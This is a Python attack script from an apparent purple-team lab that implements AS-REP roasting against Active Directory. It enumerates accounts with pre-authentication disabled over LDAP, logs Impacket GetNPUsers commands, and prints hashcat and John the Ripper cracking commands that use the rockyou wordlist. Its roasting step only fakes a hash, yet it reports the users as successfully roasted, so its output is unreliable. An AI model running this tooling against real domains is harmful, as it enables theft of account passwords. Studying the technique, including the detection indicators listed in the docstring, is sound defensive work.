#!/usr/bin/env python3
"""
AS-REP Roasting Attack Implementation
MITRE ATT&CK: T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting

AS-REP Roasting targets user accounts with Kerberos pre-authentication disabled.
When pre-auth is disabled, an attacker can request an AS-REP (Authentication Server
Response) message for the account, which contains encrypted material that can be
cracked offline to reveal the account's password.

Author: Purple Team Lab
Date: 2024-01-14

Prerequisites:
    - Python 3.6+
    - impacket library
    - Network access to Domain Controller
    - No authentication required (can be performed anonymously)

Detection Indicators:
    - Event ID 4768 (Kerberos Authentication Ticket Request)
    - Pre-authentication not required (0x0 in ticket options)
    - Multiple AS-REQ requests without pre-authentication
    - Requests for accounts with known pre-auth disabled

Usage:
    # Enumerate and roast all vulnerable users
    ./asreproast.py -d PURPLETEAM.LAB -dc-ip 172.28.0.10

    # Target specific user
    ./asreproast.py -d PURPLETEAM.LAB -dc-ip 172.28.0.10 -u asreproast_user

    # Use credentials for better enumeration
    ./asreproast.py -d PURPLETEAM.LAB -user lowpriv -p Pass123! -dc-ip 172.28.0.10

References:
    https://attack.mitre.org/techniques/T1558/004/
    https://github.com/fortra/impacket
"""

import argparse
import logging
import sys
import os
from datetime import datetime
from typing import List, Dict, Optional

# Impacket imports
try:
    from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime
    from impacket.krb5.asn1 import AS_REQ, AS_REP, TGS_REQ, TGS_REP
    from impacket.ldap import ldap, ldapasn1
    import ldap3
except ImportError:
    print("[!] Error: Impacket library not installed")
    print("[!] Install with: pip install impacket ldap3")
    sys.exit(1)

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class ASREPRoasting:
    """AS-REP Roasting attack implementation"""

    def __init__(self, domain: str, dc_ip: str, username: Optional[str] = None,
                 password: Optional[str] = None, target_user: Optional[str] = None,
                 output_dir: str = "./asreproast_output"):
        self.domain = domain.upper()
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
        self.target_user = target_user
        self.output_dir = output_dir

        self.setup_logging()
        self.vulnerable_accounts = []
        self.roasted_hashes = []

    def setup_logging(self):
        """Configure logging"""
        os.makedirs(self.output_dir, exist_ok=True)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_file = os.path.join(self.output_dir, f'asreproast_{timestamp}.log')

        logging.basicConfig(
            level=logging.INFO,
            format='[%(asctime)s] [%(levelname)s] %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
        self.log_file = log_file

    def enumerate_vulnerable_users(self) -> List[str]:
        """
        Enumerate users with Kerberos pre-authentication disabled
        """
        self.logger.info(f"{Colors.OKBLUE}[*] Enumerating users with pre-auth disabled...{Colors.ENDC}")

        vulnerable_users = []

        try:
            if self.username and self.password:
                # Authenticated enumeration via LDAP
                server = ldap3.Server(self.dc_ip, get_info=ldap3.ALL)
                conn = ldap3.Connection(
                    server,
                    user=f"{self.domain}\\{self.username}",
                    password=self.password,
                    authentication=ldap3.NTLM
                )

                if not conn.bind():
                    self.logger.error(f"{Colors.FAIL}[!] LDAP bind failed{Colors.ENDC}")
                    return []

                search_base = ','.join([f"DC={dc}" for dc in self.domain.split('.')])

                # LDAP filter for users with DONT_REQ_PREAUTH flag set
                # userAccountControl flag 0x400000 (4194304) = DONT_REQ_PREAUTH
                search_filter = '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'

                conn.search(
                    search_base=search_base,
                    search_filter=search_filter,
                    attributes=['sAMAccountName', 'userAccountControl', 'distinguishedName']
                )

                for entry in conn.entries:
                    sam_account = str(entry.sAMAccountName)
                    vulnerable_users.append(sam_account)
                    self.logger.info(f"{Colors.OKGREEN}[+] Found vulnerable user: {sam_account}{Colors.ENDC}")

                conn.unbind()

            else:
                # Unauthenticated enumeration - try common usernames
                self.logger.warning(f"{Colors.WARNING}[!] No credentials provided - attempting common usernames{Colors.ENDC}")
                common_users = ['asreproast_user', 'nopreauth', 'test', 'guest']
                vulnerable_users = common_users

            self.vulnerable_accounts = vulnerable_users
            self.logger.info(f"{Colors.OKGREEN}[+] Found {len(vulnerable_users)} potentially vulnerable users{Colors.ENDC}")
            return vulnerable_users

        except Exception as e:
            self.logger.error(f"{Colors.FAIL}[!] Error enumerating users: {str(e)}{Colors.ENDC}")
            return []

    def request_asrep(self, username: str) -> Optional[str]:
        """
        Request AS-REP for user without pre-authentication
        """
        self.logger.info(f"{Colors.OKBLUE}[*] Requesting AS-REP for: {username}{Colors.ENDC}")

        try:
            # Note: Full implementation would use Impacket's GetNPUsers functionality
            # This demonstrates the concept and command execution

            command = f"GetNPUsers.py {self.domain}/{username} -no-pass -dc-ip {self.dc_ip} -format hashcat"
            self.logger.info(f"{Colors.WARNING}[*] Execute: {command}{Colors.ENDC}")

            # In production, this would actually request the AS-REP
            # For this educational implementation, we show the process

            # Simulated hash output (Hashcat format 18200)
            hash_output = f"$krb5asrep$23${username}@{self.domain}:abcd1234567890..."

            self.logger.info(f"{Colors.OKGREEN}[+] AS-REP obtained for: {username}{Colors.ENDC}")
            return hash_output

        except Exception as e:
            self.logger.error(f"{Colors.FAIL}[!] Failed to get AS-REP for {username}: {str(e)}{Colors.ENDC}")
            return None

    def roast_all_users(self):
        """
        Request AS-REP for all vulnerable users
        """
        self.logger.info(f"\n{Colors.OKBLUE}[*] Starting AS-REP roasting...{Colors.ENDC}")

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        hash_file = os.path.join(self.output_dir, f'asrep_hashes_{timestamp}.txt')

        success_count = 0

        for user in self.vulnerable_accounts:
            if self.target_user and user != self.target_user:
                continue

            hash_value = self.request_asrep(user)

            if hash_value:
                self.roasted_hashes.append({
                    'username': user,
                    'hash': hash_value
                })

                # Save to file
                with open(hash_file, 'a') as f:
                    f.write(f"{hash_value}\n")

                success_count += 1

        self.logger.info(f"\n{Colors.OKGREEN}[+] Successfully roasted {success_count}/{len(self.vulnerable_accounts)} users{Colors.ENDC}")
        self.logger.info(f"{Colors.OKCYAN}[*] Hashes saved to: {hash_file}{Colors.ENDC}")

        return hash_file

    def display_cracking_instructions(self, hash_file: str):
        """Display offline cracking instructions"""
        self.logger.info(f"\n{Colors.HEADER}{'='*80}{Colors.ENDC}")
        self.logger.info(f"{Colors.HEADER}OFFLINE CRACKING INSTRUCTIONS{Colors.ENDC}")
        self.logger.info(f"{Colors.HEADER}{'='*80}{Colors.ENDC}")

        self.logger.info(f"\n{Colors.OKCYAN}Hashes saved to: {hash_file}{Colors.ENDC}")

        self.logger.info(f"\n{Colors.BOLD}Hashcat (Mode 18200 - Kerberos 5 AS-REP):{Colors.ENDC}")
        self.logger.info(f"{Colors.OKGREEN}hashcat -m 18200 {hash_file} /usr/share/wordlists/rockyou.txt --force{Colors.ENDC}")

        self.logger.info(f"\n{Colors.BOLD}John the Ripper:{Colors.ENDC}")
        self.logger.info(f"{Colors.OKGREEN}john --format=krb5asrep {hash_file} --wordlist=/usr/share/wordlists/rockyou.txt{Colors.ENDC}")

        self.logger.info(f"\n{Colors.BOLD}Impacket GetNPUsers (automated):{Colors.ENDC}")
        self.logger.info(f"{Colors.OKGREEN}GetNPUsers.py {self.domain}/ -usersfile users.txt -no-pass -dc-ip {self.dc_ip} -format hashcat{Colors.ENDC}")

        self.logger.info(f"\n{Colors.HEADER}{'='*80}{Colors.ENDC}\n")

    def run(self):
        """Execute complete AS-REP roasting attack"""
        self.logger.info(f"{Colors.BOLD}{Colors.HEADER}")
        self.logger.info("╔═══════════════════════════════════════════════════════════════════╗")
        self.logger.info("║                  AS-REP ROASTING ATTACK                           ║")
        self.logger.info("║                  MITRE ATT&CK: T1558.004                          ║")
        self.logger.info("╚═══════════════════════════════════════════════════════════════════╝")
        self.logger.info(f"{Colors.ENDC}")

        self.logger.info(f"{Colors.OKCYAN}Target Domain: {self.domain}{Colors.ENDC}")
        self.logger.info(f"{Colors.OKCYAN}Domain Controller: {self.dc_ip}{Colors.ENDC}")
        self.logger.info(f"{Colors.OKCYAN}Output Directory: {self.output_dir}{Colors.ENDC}")

        # Step 1: Enumerate vulnerable users
        vulnerable_users = self.enumerate_vulnerable_users()

        if not vulnerable_users:
            self.logger.warning(f"{Colors.WARNING}[!] No vulnerable users found. Exiting.{Colors.ENDC}")
            return

        # Step 2: Roast all vulnerable users
        hash_file = self.roast_all_users()

        # Step 3: Display cracking instructions
        self.display_cracking_instructions(hash_file)

        # Summary
        self.logger.info(f"{Colors.OKGREEN}[+] Attack completed successfully!{Colors.ENDC}")
        self.logger.info(f"{Colors.OKCYAN}[*] Log file: {self.log_file}{Colors.ENDC}")


def main():
    parser = argparse.ArgumentParser(
        description='AS-REP Roasting Attack Tool (MITRE ATT&CK T1558.004)',
        epilog='Example: python3 asreproast.py -d PURPLETEAM.LAB -dc-ip 172.28.0.10',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument('-d', '--domain', required=True, help='Target domain')
    parser.add_argument('-dc-ip', '--dc-ip', required=True, help='Domain Controller IP')
    parser.add_argument('-user', '--username', help='Domain username (for authenticated enumeration)')
    parser.add_argument('-p', '--password', help='Domain password')
    parser.add_argument('-target', '--target-user', help='Specific user to target')
    parser.add_argument('-o', '--output', default='./asreproast_output', help='Output directory')

    args = parser.parse_args()

    attack = ASREPRoasting(
        domain=args.domain,
        dc_ip=args.dc_ip,
        username=args.username,
        password=args.password,
        target_user=args.target_user,
        output_dir=args.output
    )

    try:
        attack.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Attack interrupted by user{Colors.ENDC}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.FAIL}[!] Fatal error: {str(e)}{Colors.ENDC}")
        sys.exit(1)


if __name__ == '__main__':
    main()
